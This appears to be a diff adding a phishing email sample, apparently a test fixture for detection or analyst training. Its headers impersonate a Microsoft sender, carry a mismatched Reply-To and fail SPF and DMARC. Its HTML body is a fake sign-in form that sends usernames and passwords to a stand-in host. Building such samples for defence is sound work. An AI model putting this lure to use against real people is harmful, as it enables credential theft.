@@ -1,0 +1,12 @@
+Received: from 203.0.113.31 (mailer-node-03.example [203.0.113.31]) by recipient-gateway.example; Thu, 07 Sep 2026 08:40:00 +0000
+From: Microsoft Check <microsoft-check.example@mailer.example>
+To: analyst@example.org
+Reply-To: accounts-303@mailbox.example
+Return-Path: <bounce@mailer.example>
+Message-ID: <1720552283.af73cd@mail-node-03>
+Date: Thu, 07 Sep 2026 08:40:00 +0000
+Subject: Confirm your profile
+Authentication-Results: recipient-gateway.example; spf=fail; dmarc=fail
+Content-Type: text/html; charset=utf-8
+
+<html><body><table><tr><td><form action="https://microsoft-check.example/auth/session/987654"><input type="text" name="user"><input type="password" name="password"><button>Sign in</button></form></td></tr></table></body></html>
